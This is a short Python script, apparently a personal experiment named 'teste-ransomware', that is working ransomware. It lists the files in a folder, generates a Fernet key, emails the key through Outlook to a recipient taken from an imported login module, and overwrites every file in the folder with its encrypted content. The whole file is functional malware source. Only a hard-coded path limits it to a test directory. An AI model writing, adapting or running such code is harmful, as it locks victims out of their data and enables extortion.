import os
import win32com.client as win32
from cryptography.fernet import Fernet
from login import username, password, rec

path = 'C:\\Users\\danil\\OneDrive\\Área de Trabalho\\teste-ransomware\\documentos'
email = username
pss = password


# Lista responsável por receber os nomes dos arquivos
def files_list(way):
    new_file = []
    for file in os.listdir(way):
        if file == 'ransomware.py':
            continue
        new_file.append(file)
    return new_file


# Função responsável por criar o e-mail e envia-lo
def send_email(key):
    # Integra o outlook com a aplicação
    outlook = win32.Dispatch('outlook.application')

    # Cria um e-mail
    email = outlook.CreateItem(0)

    # Configurações do e-mail
    email.To = rec
    email.Subject = 'Chave'
    email.HTMLBody = f'<p>{key}</p>'
    email.Send()


# Função responsável por receber os nomes da lista e realizar a criptografia do conteúdo
def crypto(way, list_files):
    key = Fernet.generate_key()  # Gera a chave simples de criptografia
    cipher_suit = Fernet(
        key)  # Cria um suit de criptografia (variavel que utiliza a chave para procedimento criptograficos)

    send_email(key)

    for file in list_files:
        new_way = way + '\\' + file
        with open(new_way, 'rb') as thefile:
            content = thefile.read()  # Conteúdo do arquivo atual
            with open(new_way, 'wb') as cipher:
                cipher.write(cipher_suit.encrypt(content))  # Troca o conteúdo atual pelo mesmo conteúdo criptografado
                thefile.close()  # Finaliza a operação no arquivo atual


files = files_list(path)
crypto(path, files)
